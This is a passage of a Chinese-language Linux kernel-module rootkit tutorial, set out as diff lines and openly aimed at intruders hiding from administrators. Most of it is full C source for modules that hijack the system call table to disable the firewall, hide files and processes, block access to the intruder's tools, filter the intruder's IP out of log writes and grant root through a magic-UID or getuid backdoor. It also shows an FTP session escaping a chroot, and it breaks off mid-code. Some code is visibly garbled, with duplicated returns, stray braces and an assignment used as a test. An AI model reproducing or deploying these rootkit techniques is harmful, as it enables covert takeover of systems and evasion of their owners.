+c). 一些调用如socket,send,receive,...是通过一个系统调用实现的，正如以前我提过的。在include文件中找一下相关系统调用。记住并非所有的C库函数都对应一个系统调用！大多函数根本不同任何系统调用有关系。有一点经验的黑客会看一下　I.2中的系统调用列表，那里有足够的信息。例如很明显用户ID管理是通过uid系统调用实现的。如果你想更有把握，你也可以看一下库源代码/内核源代码。
+比较棘手的问题是管理员写自己的应用程序来检查系统的集成性/安全性。这些程序会导致源代码泄露，我们无法得知这些程序如何工作也不知为了隐藏行迹和工具应截获哪些系统调用。也有可能管理员引入一个隐藏的LKM作为一个漂亮的象黑客做的一样的系统调用去检查系统的安全性（管理员经常使用黑客技术保护自己的系统）。所以下一步我们该怎么办？
+
+寻找重要的系统调用（strace命令方法）
+假设你懂用超级管理程序检查系统（可用多种方式做，如截获TTY（见II.9/附录A），一个问题是你在超级管理程序中要隐藏自己的行迹直到某一时刻...）。所以用strace运行程序（可能要求你有root权限）。
+#strace ‘要运行的程序’
+这个命令将给出一个漂亮的输出，就是运行程序中用到的所有系统调用甚至包括管理员在他的伪装LKM（如果有的话）用到的系统调用。我没有能演示简单输出的超级管理程序，但我们可以看一下’strace whoami’的输出结果。
+execve("/usr/bin/whoami", ["whoami"], [/* 50 vars */]) = 0
+mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40007000
+mprotect(0x40000000, 20673, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
+mprotect(0x8048000, 6324, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
+stat("/etc/ld.so.cache", {st_mode=S_IFREG|0644, st_size=13363, ...}) = 0
+open("/etc/ld.so.cache", O_RDONLY) = 3
+mmap(0, 13363, PROT_READ, MAP_SHARED, 3, 0) = 0x40008000
+close(3) = 0
+stat("/etc/ld.so.preload", 0xbffff780) = -1 ENOENT (No such file or directory)
+open("/lib/libc.so.5", O_RDONLY) = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3"..., 4096) = 4096
+mmap(0, 761856, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4000c000
+mmap(0x4000c000, 530945, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED, 3, 0) =0x4000c000
+mmap(0x4008e000, 21648, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x81000) = 0x4008e000
+mmap(0x40094000, 204536, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANO
+NYMOUS, -1, 0) = 0x40094000
+close(3) = 0
+mprotect(0x4000c000, 530945, PROT_READ|PROT_WRITE|PROT_EXEC) = 0
+munmap(0x40008000, 13363) = 0
+mprotect(0x8048000, 6324, PROT_READ|PROT_EXEC) = 0
+mprotect(0x4000c000, 530945, PROT_READ|PROT_EXEC) = 0
+mprotect(0x40000000, 20673, PROT_READ|PROT_EXEC) = 0
+personality(PER_LINUX) = 0
+geteuid() = 500
+getuid() = 500
+getgid() = 100
+getegid() = 100
+brk(0x804aa48) = 0x804aa48
+brk(0x804b000) = 0x804b000
+open("/usr/share/locale/locale.alias", O_RDONLY) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=2005, ...}) = 0
+mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x40008000
+read(3, "# Locale name alias data base\n#"..., 4096) = 2005
+brk(0x804c000) = 0x804c000
+read(3, "", 4096) = 0
+close(3) = 0
+munmap(0x40008000, 4096) = 0
+open("/usr/share/i18n/locale.alias", O_RDONLY) = -1 ENOENT (No such file or directory)
+open("/usr/share/locale/de_DE/LC_CTYPE", O_RDONLY) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=10399, ...}) = 0
+mmap(0, 10399, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40008000
+close(3) = 0
+geteuid() = 500
+open("/etc/passwd", O_RDONLY) = 3
+fstat(3, {st_mode=S_IFREG|0644, st_size=1074, ...}) = 0
+mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4000b000
+read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1074
+close(3) = 0
+munmap(0x4000b000, 4096) = 0
+fstat(1, {st_mode=S_IFREG|0644, st_size=2798, ...}) = 0
+mmap(0, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x4000b000
+write(1, "r00t\n", 5r00t) = 5
+_exit(0) = ?
+
+这是一个非常不错的结果，列出了whoami命令用到的所有系统调用，不是吗？为了控制
+whoami的输出，有四个重要的系统调用可被截获：
+geteuid() = 500
+getuid() = 500
+getgid() = 100
+getegid() = 100
+看一下II.6是如何解决那个问题的。分析程序的方法也是快速查询其它标准工具的一个重要方法。
+我希望现在你有能力找到一些系统调用了。这些系统调用可用来使你隐藏行迹，做系统后门，或任何你想干的。
+
+迷惑内核系统表
+在 II.1中你可以看到如何访问sys_call_table，它通过内核符号表导出。现在思考一下，通过在我们的模块中访问它们，我们可以改动任何引出项（如函数，结构，变量）。在/proc/ksyms中列出的所有项都可被截获。但我们的模块不能用这种方式改，因为我们没引出任何符号。这里是我机器上 /proc/ksyms文件的一部分，用来展示一下你可以改什么。
+...
+001bf1dc ppp_register_compressor
+001bf23c ppp_unregister_compressor
+001e7a10 ppp_crc16_table
+001b9cec slhc_init
+001b9ebc slhc_free
+001baa20 slhc_remember
+001b9f6c slhc_compress
+001ba5dc slhc_uncompress
+001babbc slhc_toss
+001a79f4 register_serial
+001a7b40 unregister_serial
+00109cec dump_thread
+00109c98 dump_fpu
+001c0c90 __do_delay
+001c0c60 down_failed
+001c0c80 down_failed_interruptible
+001c0c70 up_wakeup
+001390dc sock_register
+00139110 sock_unregister
+0013a390 memcpy_fromiovec
+001393c8 sock_setsockopt
+00139640 sock_getsockopt
+001398c8 sk_alloc
+001398f8 sk_free
+00137b88 sock_wake_async
+00139a70 sock_alloc_send_skb
+0013a408 skb_recv_datagram
+0013a580 skb_free_datagram
+0013a5cc skb_copy_datagram
+0013a60c skb_copy_datagram_iovec
+0013a62c datagram_select
+00141480 inet_add_protocol
+001414c0 inet_del_protocol
+001ddd18 rarp_ioctl_hook
+001bade4 init_etherdev
+00140904 ip_rt_route
+001408e4 ip_rt_dev
+00150b84 icmp_send
+00143750 ip_options_compile
+001408c0 ip_rt_put
+0014faa0 arp_send
+0014f5ac arp_bind_cache
+001dd3cc ip_id_count
+0014445c ip_send_check
+00142bc0 ip_forward
+001dd3c4 sysctl_ip_forward
+0013a994 register_netdevice_notifier
+0013a9c8 unregister_netdevice_notifier
+0013ce00 register_net_alias_type
+0013ce4c unregister_net_alias_type
+001bb208 register_netdev
+001bb2e0 unregister_netdev
+001bb090 ether_setup
+0013d1c0 eth_type_trans
+0013d318 eth_copy_and_sum
+0014f164 arp_query
+00139d84 alloc_skb
+00139c90 kfree_skb
+00139f20 skb_clone
+0013a1d0 dev_alloc_skb
+0013a184 dev_kfree_skb
+0013a14c skb_device_unlock
+0013ac20 netif_rx
+0013ae0c dev_tint
+001e6ea0 irq2dev_map
+0013a7a8 dev_add_pack
+0013a7e8 dev_remove_pack
+0013a840 dev_get
+0013b704 dev_ioctl
+0013abfc dev_queue_xmit
+001e79a0 dev_base
+0013a8dc dev_close
+0013ba40 dev_mc_add
+0014f3c8 arp_find
+001b05d8 n_tty_ioctl
+001a7ccc tty_register_ldisc
+0012c8dc kill_fasync
+0014f164 arp_query
+00155ff8 register_ip_masq_app
+0015605c unregister_ip_masq_app
+00156764 ip_masq_skb_replace
+00154e30 ip_masq_new
+00154e64 ip_masq_set_expire
+001ddf80 ip_masq_free_ports
+001ddfdc ip_masq_expire
+001548f0 ip_masq_out_get_2
+001391e8 register_firewall
+00139258 unregister_firewall
+00139318 call_in_firewall
+0013935c call_out_firewall
+001392d4 call_fw_firewall
+...
+只看call_in_firewall，这个函数在内核中用于防火墙管理，如果我们用一个伪造的函数代替它会怎样呢？看如下LKM：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+　
+/*得到引出的函数*/
+extern int *call_in_firewall;
+/*我们自己的无用的call_in_firewall*/
+int new_call_in_firewall()
+{
+return 0;
+}
+int init_module(void) /*module setup*/
+{
+call_in_firewall=new_call_in_firewall;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+}
+编译/加载此LKM并执行’ipfwadm –I –a deny’。然后执行’ping 127.0.0.1’，你的内核会产生一条有趣的错误信息，因为调用的call_in_firewall(...)函数已经换成假的了（此例中你可跳过防火墙安装）。这是一种破坏引出符号的非常粗鲁的方式。你也可以反汇编某个特定符号（用gdb）然后修改某些特定字节，以改变符号的工作方式。想象一下，在引出函数中有IF THEN结构，反汇编这个函数，查找象JNZ，JNE这样的命令，会怎样　...这种方法可修补重要项。当然，你也可以在内核/模块源码中找这些函数，但当你只能得到模块的二进制代码时怎么办，这时反汇编就很有用了。
+
+针对文件系统的黑客方法
+LKM入侵的最重要特征就是在本地文件系统中隐藏某些项（你留的漏洞，窃听（+记录），等等）的能力。
+如何隐藏文件
+想象一下管理员是如何发现你的文件的：他会用‘ls’看所有的东西。对那些不知道的人，strace 命令检查ls可让你知道获得目录列表的系统调用为
+int sys_getdents (unsigned int fd, struct dirent *dirent, unsigned int count);
+所以我们知道应从哪里入手攻击了。下面的一段代码取自AFHRM（Michal Zalewski）的hacked_getdents系统调用，这个模块可隐藏任何用ls列的文件和用getdents系统调用列的应用程序。
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+int (*orig_getdents) (uint, struct dirent *, uint);
+int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
+{
+unsigned int tmp, n;
+int t, proc = 0;
+struct inode *dinode;
+struct dirent *dirp2, *dirp3;
+char hide[]="ourtool"; /*要隐藏的文件*/
+/*调用原始的getdents -> 结果放入tmp*/
+tmp = (*orig_getdents) (fd, dirp, count);
+/*目录缓存处理directory cache handling*/
+/*必须这样检查，因为原始getdents可能把结果放入任务进程的结构的缓存中。*/
+#ifdef __LINUX_DCACHE_H
+dinode = current->files->fd[fd]->f_dentry->d_inode;
+#else
+dinode = current->files->fd[fd]->f_inode;
+#endif
+/*dinode 是所请求目录的i节点*/
+if (tmp > 0)
+{
+/*dirp2 is a new dirent structure*/
+dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+/*copy original dirent structure to dirp2*/
+memcpy_fromfs(dirp2, dirp, tmp);
+/*dirp3 points to dirp2*/
+dirp3 = dirp2;
+t = tmp;
+while (t > 0)
+{
+n = dirp3->d_reclen;
+t -= n;
+/*检查当前的文件名是否为我们想要隐藏的文件*/
+if (strstr((char *) &(dirp3->d_name), (char *) &hide) != NULL)
+{
+/*如果有必要则修改dirent结构*/
+if (t != 0)
+memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
+else
+dirp3->d_off = 1024;
+tmp -= n;
+}
+if (dirp3->d_reclen == 0)
+{
+/*处理一些该死的不正确使用getdents系统调用的 fs 驱动程序*/
+tmp -= t;
+t = 0;
+}
+if (t != 0)
+dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
+}
+memcpy_tofs(dirp, dirp2, tmp);
+kfree(dirp2);
+}
+return tmp;
+return tmp;
+}
+
+int init_module(void) /*module setup*/
+{
+orig_getdents=sys_call_table[SYS_getdents];
+sys_call_table[SYS_getdents]=hacked_getdents;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_getdents]=orig_getdents;
+}
+对新手：读注释，用心思考10分钟。然后继续。这种欺骗方式很有效，但记住管理员通过直接访问仍然能看到你的文件，如’cat ourtool’或’ls ourtool’就可以。所以你的工具不要用很详细的名字如sniffer,mountdxpl.c等等。当然还有办法防止管理员读你的文件，接着读吧。
+
+如何隐藏文件内容（总体说明）
+我从未看到过隐藏文件内容的真正实现程序，当然在一些象AFHRM的Michal Zalewski写的LKM中有控制内容/删除函数，但不是真正的隐藏内容。我怀疑有很多人就这样做，但没谁写出来过，所以我写了。很清楚，有很多办法做这些，第一种办法很简单，截获open系统调用检查文件名是不是’ourtool’，如果是就否决任何打开文件的尝试，所以读/写或其它事情都不能做。让我们实现这个LKM：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+
+int (*orig_open)(const char *pathname, int flag, mode_t mode);
+
+int hacked_open(const char *pathname, int flag, mode_t mode) /*由于是指针，所指的内容在用户数据区，不能直接访问*/
+{
+char *kernel_pathname;
+char hide[]="ourtool";
+/*把文件名传到内核空间*/
+kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);
+memcpy_fromfs(kernel_pathname, pathname, 255);
+if (strstr(kernel_pathname, (char*)&hide ) != NULL)
+{
+kfree(kernel_pathname);
+/*返回错误代码'file does not exist'*/
+return -ENOENT;
+}
+else
+{
+kfree(kernel_pathname);
+/*如果不是处理我们的’ourtool’，一切照常*/
+return orig_open(pathname, flag, mode);
+}
+}
+　
+int init_module(void) /*module setup*/
+{
+orig_open=sys_call_table[SYS_open];
+sys_call_table[SYS_open]=hacked_open;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_open]=orig_open;
+}
+这个LKM工作的非常好，它告诉任何尝试访问我们文件的人，文件不存在。但我们自己如何访问这些文件呢，有好多方法:
+设置一个magic-string
+检查uid或gid（要求建立某一特定用户）
+检查时间
+
+如何隐藏文件的特定部分（源语示例）
+在 3.2中提到的方法对我们自己的工具/记录都是非常有用的。但用来修改管理员/其它用户的文件会怎样呢？想象一下你想控制/var/log /messages中关于你的IP地址/DNS名称的那些记录项。我们知道成百上千个后门用来在任何记录文件中隐藏我们的标记，但LKM究竟怎样滤掉写向文件的任何字符串（数据）的呢。如果这个字符串包含任何有关我们标记（例如IP地址）的任何数据，我们应该否决（可以简单的忽略/返回）。下面的实现是非常基本的原型LKM，只用来展示。我以前从未见过，但从3.2可知有些人已经这么做了很多年了。
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+　
+int (*orig_write)(unsigned int fd, char *buf, unsigned int count);
+int hacked_write(unsigned int fd, char *buf, unsigned int count)
+{
+char *kernel_buf;
+char hide[]="127.0.0.1"; /*我们想要隐藏的IP地址*/
+kernel_buf = (char*) kmalloc(1000, GFP_KERNEL);
+memcpy_fromfs(kernel_buf, buf, 999);
+if (strstr(kernel_buf, (char*)&hide ) != NULL)
+{
+kfree(kernel_buf);
+/*告诉程序，我们已经写了1字节*/
+return 1;
+}
+else
+{
+kfree(kernel_buf);
+return orig_write(fd, buf, count);
+}
+}
+int init_module(void) /*module setup*/
+{
+orig_write=sys_call_table[SYS_write];
+sys_call_table[SYS_write]=hacked_write;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_write]=orig_write;
+}
+这个LKM有几个不好的地方，它不检查写的对象（可用fd检查，读一些例子）。这意味着象’echo ‘127.0.0.1’’也会被禁止。你也可以修改将被写入的字符串，所以它可能是你喜欢的某个人的IP地址....总之，基本思想是很清楚的。
+
+如何重定向/监视文件操作
+很古老的思路，最先被AFHRM的Michal Zalewski实现。这里我就不写任何代码了，因为太容易实现了（你看过II.4.3/II.4.2之后）。在很多事情上你可以监视/重定向文件系统事件：
+某人写文件->拷贝内容到另一个文件=>可通过sys_write(...)完成重定向。
+某人能读敏感文件->监视某个文件的读=>可通过sys_read(...)完成重定向。
+打开文件->我们可以监视整个系统的这类事件=>截获sys_open(...)并写入记录文件；这是AFHRM监视系统中文件的方法（源码见IV.3）
+link/unlink事件->监视所有链接的创建=>截获sys_link(...)（源码见IV.3）
+rename事件->监视所有改文件名的事件=>截获sys_rename(...)（源码见IV.3）
+...
+有一点非常有趣（尤其对管理员），因为你可以监视整个系统的文件变化。我认为，监视用’touch’和’mkdir’命令建立的文件/目录也很有意思。例如’touch’命令不用open创建文件；用strace命令显示如下（节选）：
+...
+stat("ourtool", 0xbffff798) = -1 ENOENT (无此文件或目录)
+creat("ourtool", 0666) = 3
+close(3) = 0
+_exit(0) = ?
+如你所见，系统用调用sys_creat(...)来创建新文件。我认为这里提供源代码就没必要了，太琐碎了，不过就是截获sys_creat(...)然后用printk(...)把所有文件名写入记录文件。这些就是AFHRM记录所有重要事件的方法。这种黑客方法不单针对文件系统，对一般的权限问题也非常重要。猜一下应截获哪个系统调用。Phrack(plaguez)建议用万能UID接管sys_setuid(...)。这意味着无论何时用万能UID 使用setuid时，模块将把UID置0（超级用户）。
+让我们看一下他的实现（只有hacked_setuid系统调用）：
+...
+int hacked_setuid(uid_t uid)
+{
+int tmp;
+/*我们有万能UID吗(在LKM中前面的某处定义) */
+if (uid == MAGICUID) {
+/*如成立将所有的UIDs置0 (超级用户)*/
+current->uid = 0;
+current->euid = 0;
+current->gid = 0;
+current->egid = 0;
+return 0;
+}
+tmp = (*orig_setuid) (uid);
+return tmp;
+return tmp;
+}
+...
+我认为下面的技巧在某些情况下也很有用。想象一下这样的情形：你给了（非常蠢的）管理员一个恶意木马；这个木马安装了如下LKM到系统中[我没有实现隐藏功能，这只是我思路的一个框架]：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+
+int (*orig_getuid)();
+int hacked_getuid()
+{
+int tmp;
+/*检查是否我的UID*/
+if (current->uid=500) {
+/*如果是我的UID -> 意味着我在登录->给我一个rootshell*/
+current->uid = 0;
+current->euid = 0;
+current->gid = 0;
+current->egid = 0;
+return 0;
+}
+tmp = (*orig_getuid) ();
+return tmp;
+}
+
+int init_module(void) /*module setup*/
+{
+orig_getuid=sys_call_table[SYS_getuid];
+sys_call_table[SYS_getuid]=hacked_getuid;
+return 0;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+sys_call_table[SYS_getuid]=orig_getuid;
+}
+如果这个LKM被加载到我们只是普通用户的操作系统中，登录之后我们会得到一个roots hell（当前进程有超级用户权力）。如我在第一部分提到的，current指的是当前任务（task）结构。
+
+如何使黑客工具目录不可访问
+对黑客来说建个目录放自己经常使用的工具很重要（黑客高手不使用常规的本地文件系统存放数据）。用getdents方法可以隐藏我们的目录/文件，用open方法可使我们的文件不可访问，但如何使我们的目录不可访问呢？
+象通常的做法一样，看一下include/sys/syscall.h，你会发现SYS_chdir是我们要的系统调用（不信的话可用strace命令看一下’cd’）。这次我不给出源码，因为你只需截获sys_mkdir，做一下字符串比较。然后做常规调用（如不是我们的目录）或返回ENOTDIR（意味着‘此目录不存在’）。现在你的工具中级管理员就不能发现了（高级/有病的管理员会在最底层扫描硬盘，但在今天除了我们谁会这么疯狂？！）这种硬盘扫描也可击败，因为所有的一切都是基于系统调用的。
+
+如何改变CHROOT环境
+思路完全来自 HISPAHACK（hispahack.ccc.de）。他们就这种模式（受限FTP）发表了一篇很好的文章，我要用几句话解释一下他们的思路。请注意下面的例子不在适用，它太老了（看wu-ftpd版本）。我在这里只是用它来解释如何用LKM来解脱chroot环境限制。下例基于很老的软件（wuftpf），所以不要再在新版的wu-ftpd上尝试了，没用的。HISPAHACK的文章的基本思想是这样的，有一个受限的FTP用户帐号，它有如下权限：
+drwxr-xr-x 6 user users 1024 Jun 21 11:26 /home/user/
+drwx--x--x 2 root root 1024 Jun 21 11:26 /home/user/bin/
+这表明（你会发现经常这样）user（我们）可以改bin目录的名字，因为它在我们的主目录下。做事之前让我们看一下wu-ftpd是如何工作的（我们用这种服务器做解释，但思路是通用的），如果我们送出列表命令../bin/ls将以UID=0（EUID=user的uid）执行。但执行以前，wu.ftpd将用chroot(...)设置进程的根目录以使我们被限制在主目录之中。这样就防止了我们用受限的FTP帐户访问文件系统的其它部分。现在想象一下我们用其它程序代替/bin/ls，则这个程序将以root身份执行（uid=0）。但又能怎样呢，因为有chroot(...)调用，我们不能访问整个系统。这就是我们需要LKM帮助我们的地方。我们用一个可加载我们提供的LKM的程序替换掉../bin/ls，这个模块将截获 sys_chroot(...)系统调用，把它改成不限制我们的形式。这意味着我们只需确使sys_chroot(...)什么也不做。 HISPAHACK用了一种非常粗鲁的方式，他们简单的把sys_chroot(...)改成返值为0并什么也不做。加载这个LKM之后，你就可以没有任何限制的启动一个进程了。这意味着你用uid=0访问整个系统。下面是HISPAHACK发表的‘黑客教程’中的一个例子：
+thx:~# ftp
+ftp> o ilm
+Connected to ilm.
+220 ilm FTP server (Version wu-2.4(4) Wed Oct 15 16:11:18 PDT 1997) ready.
+Name (ilm:root): user
+331 Password required for user.
+Password:
+230 User user logged in.; Access restrictions apply.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+total 5
+drwxr-xr-x 5 user users 1024 Jun 21 11:26 .
+drwxr-xr-x 5 user users 1024 Jun 21 11:26 ..
+d--x--x--x 2 root root 1024 Jun 21 11:26 bin
+drwxr-xr-x 2 root root 1024 Jun 21 11:26 etc
+drwxr-xr-x 2 user users 1024 Jun 21 11:26 home
+226 Transfer complete.
+ftp> cd ..
+250 CWD command successful.
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+total 5
+drwxr-xr-x 5 user users 1024 Jun 21 11:26 .
+drwxr-xr-x 5 user users 1024 Jun 21 21:26 ..
+d--x--x--x 2 root root 1024 Jun 21 11:26 bin
+drwxr-xr-x 2 root root 1024 Jun 21 11:26 etc
+drwxr-xr-x 2 user users 1024 Jun 21 11:26 home
+226 Transfer complete.
+ftp> ls bin/ls
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+---x--x--x 1 root root 138008 Jun 21 11:26 bin/ls
+226 Transfer complete.
+ftp> ren bin bin.old
+350 File exists, ready for destination name
+250 RNTO command successful.
+ftp> mkdir bin
+257 MKD command successful.
+ftp> cd bin
+250 CWD command successful.
+ftp> put ls
+226 Transfer complete.
+ftp> put insmod
+226 Transfer complete.
+ftp> put chr.o
+ftp> put chr.o
+226 Transfer complete.
+ftp> chmod 555 ls
+200 CHMOD command successful.
+ftp> chmod 555 insmod
+200 CHMOD command successful.
+ftp> ls
+200 PORT command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+UID: 0 EUID: 1002
+Cambiando EUID...
+UID: 0 EUID: 0
+Cargando modulo chroot...
+Modulo cargado.
+226 Transfer complete.
+ftp> bye
+221 Goodbye.
+thx:~#
+现在我们建立一个新的FTP任务，它是不受限的（因为LKM被加载，所以sys_chroot(...)不起作用了，你可以为所欲为（下载passwd...））。在附录中你可以找到新的ls和模块的完整源代码。
+
+针对进程的黑客方法
+目前为止我们已经整个控制了文件系统。我们已经讨论了最重要的‘黑客手法’。现在是换样的时候了。我们需要讨论一下用LKM迷惑象’ps’这样显示进程的命令。
+
+如何隐藏某个进程
+平时我们要做的最重要的事就是隐藏进程不被管理员发现。想象一下，sniffer,cracker（一般在被黑过的系统上不用）被管理员用’ps’命令看到的情形。那些老学究式的技巧，例如把sniffer的名字换一下，期望管理员足够蠢之类的，在21世纪不能算好的。我们需要整个的隐藏进程。让我们看一下 plaguez的实现方式吧（稍有改动）：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+/*我们想隐藏的进程名*/
+char mtroj[] = "my_evil_sniffer";
+int (*orig_getdents)(unsigned int fd, struct dirent *dirp, unsigned int coun
+t);
+/*把字符串转换成数字*/
+int myatoi(char *str)
+{
+int res = 0;
+int mul = 1;
+char *ptr;
+for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
+if (*ptr < '0' || *ptr > '9')
+return (-1);
+res += (*ptr - '0') * mul;
+mul *= 10;
+}
+}
+return (res);
+}
+/*从PID中获取task结构*/
+struct task_struct *get_task(pid_t pid)
+{
+struct task_struct *p = current;
+do {
+if (p->pid == pid)
+return p;
+p = p->next_task;
+}
+while (p != current);
+return NULL;
+}
+/*从task结构中获取进程名*/
+static inline char *task_name(struct task_struct *p, char *buf)
+{
+int i;
+char *name;
+name = p->comm;
+i = sizeof(p->comm);
+do {
+do {
+unsigned char c = *name;
+name++;
+i--;
+*buf = c;
+if (!c)
+break;
+if (c == '\\') {
+buf[1] = c;
+buf += 2;
+continue;
+}
+if (c == '\n') {
+buf[0] = '\\';
+buf[1] = 'n';
+buf += 2;
+continue;
+}
+buf++;
+}
+while (i);
+*buf = '\n';
+return buf + 1;
+}
+/*检查是否我们需要隐藏此进程*/
+int invisible(pid_t pid)
+{
+struct task_struct *task = get_task(pid);
+char *buffer;
+if (task) {
+buffer = kmalloc(200, GFP_KERNEL);
+memset(buffer, 0, 200);
+task_name(task, buffer);
+if (strstr(buffer, (char *) &mtroj)) {
+kfree(buffer);
+return 1;
+}
+}
+return 0;
+}
+/*有关文件系统的伪装见II.4 */
+int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
+{
+unsigned int tmp, n;
+int t, proc = 0;
+struct inode *dinode;
+struct dirent *dirp2, *dirp3;
+tmp = (*orig_getdents) (fd, dirp, count);
+#ifdef __LINUX_DCACHE_H
+dinode = current->files->fd[fd]->f_dentry->d_inode;
+#else
+dinode = current->files->fd[fd]->f_inode;
+#endif
+if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
+proc=1;
+if (tmp > 0) {
+dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
+memcpy_fromfs(dirp2, dirp, tmp);
+dirp3 = dirp2;
+t = tmp;
+while (t > 0) {
+n = dirp3->d_reclen;
+t -= n;
+if ((proc && invisible(myatoi(dirp3->d_name)))) {
+if (t != 0)
+if (t != 0)
+memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
+else
+dirp3->d_off = 1024;
+tmp -= n;
+}
+if (t != 0)
+dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
+}
+memcpy_tofs(dirp, dirp2, tmp);
+kfree(dirp2);
+}
+return tmp;
+}
+
+int init_module(void) /*module setup*/
+{
+orig_getdents=sys_call_table[SYS_getdents];
+sys_call_table[SYS_getdents]=hacked_getdents;
+return 0;
+}
+void cleanup_module(void) /*module shutdown*/
+{
+{
+sys_call_table[SYS_getdents]=orig_getdents;
+}
+
+代码似乎很复杂，但如果你知道’ps’和其它进程分析工具是如何工作的，理解它就是很容易的了。象’ps’这样的命令在列出当前进程时并未使用任何特殊的系统调用，但通过strace查询你会发现它是从/proc/目录下获取信息的。在此目录下你会发现很多用数字做名字的目录。这些数字就是此系统当前正运行的程序的PID。在这些目录里你看到的文件提供了这些进程的所有信息。所以’ps’只是’ls’了一下/proc/；它找到的每一个数字都代表一个那个著名列表中的PID。它显示给我们的所有进程的信息都来自/proc/PID/下的文件。现在你可能明白了，’ps’要读取/proc/目录下的内容，就一定要用到sys_getdents(...)。我们只要得到/proc/下找到的PID的名字，如果它是我们想要隐藏的进程名，我们就在/proc/下把它隐藏起来（象我们针对文件系统中其它文件做的那样->见4.1）。两个task函数和invisible(...)函数只是用来得到proc目录下给定的PID的名称，学过4.1之后文件隐藏应该很清楚。在plaguez的方法中我要提一点，我不知他为什么用自己编写的atoi函数，用 simple_strtoul(...)简单点，但可能有其它含义。当然，在完整的隐藏模块中，你应在处理过的getdents调用中隐藏文件和进程（这是plaguez的处理方式）。Runar Jensen 用另一种更复杂的方式。他把/proc目录下的PID也隐藏起来，但是他检查是否隐藏的方式有点不同。他在task结构中用标记字段。这个 unsigned long字段用下面的常量保存task的一些信息。
+PF_PTRACED : 当前进程被
+PF_TRACESYS : " " " "
+PF_STARTING : 进程将执行
+PF_EXITING : 进程将终止
+现在Runar Jensen加入他自己的常量（PF_INVISIBLE）用以指明对应的进程应是不可见的，所以用sys_getdents(...)时这个PID的名字应不被解析。你必须检查task的标记字段。这听起来比‘名称’法简单，但我们如何为想隐藏的进程设置标记位呢。Runar Jensen使用挂起sys_kill(...)这种最简单的方法。’kill’命令可以通过指定PID发送特别的代码（如9代表终止）给某个进程。所以运行你的想要隐形的进程，用’ps’命令得到PID，然后用’kill –代码 PID。代码字段用的值不能是系统使用的（如9就是不好的选择）；Runar Jensen 用的是32。所以模块挂起sys_kill(...)然后检查代码是不是32。如果是，就必须把给sys_kill(...)的PID所指定的进程的 task标记字段置位。这是一种设置标记位的方法。很明显对简单应用来说，有点复杂。
+
+如何重定向文件的执行
+在某些情况下，重定向文件的执行非常重要。那些文件可能是/bin/login（象plaguez做的）,tcpd,等等。这么做可使你在没有关于这些文件的校验和问题的情况下插入任何木马（你无须更改这些文件）。所以我们再次找到我们所需的系统调用sys_execue(...)。让我们看一下plaguez的重定向方法（原始思想来自halflife）：
+#define MODULE
+#define __KERNEL__
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+#include
+extern void* sys_call_table[];
+/*必须定义，因为下面的系统调用宏要用到*/
+int errno;
+/*定义我们自己的系统调用*/
+int __NR_myexecve;
+/*我们要用到brk*/
+static inline _syscall1(int, brk, void *, end_data_segment);
+int (*orig_execve) (const char *, const char *[], const char *[]);
